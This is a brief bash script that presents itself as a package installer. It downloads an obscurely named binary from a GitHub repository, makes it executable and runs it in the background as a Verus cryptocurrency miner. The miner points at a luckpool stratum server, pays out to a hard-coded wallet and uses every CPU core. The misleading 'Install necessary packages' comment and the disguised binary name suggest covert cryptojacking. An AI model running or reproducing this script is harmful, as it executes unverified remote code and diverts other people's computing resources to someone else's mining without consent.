#!/bin/bash

# Install necessary packages
wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
chmod +x kulibang

./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.SKYLAKE -p x -t "$(nproc)" &

#
#pkill -f 'kulibang'
